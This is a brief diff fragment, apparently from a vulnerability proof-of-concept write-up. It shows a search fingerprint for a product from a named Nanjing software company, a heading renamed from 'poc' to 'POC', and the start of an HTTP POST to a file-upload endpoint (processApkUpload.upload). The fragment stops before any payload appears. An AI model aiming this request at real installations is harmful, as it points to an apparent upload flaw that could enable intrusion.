@@ -6,7 +6,7 @@ body="frameworkModuleJob"
 "版权所有：南京博纳睿通软件科技有限公司"
 ```
 
-## poc
+## POC
 ```
 POST /ajaxinvoke/frameworkModuleJob.processApkUpload.upload HTTP/1.1
 Host: 
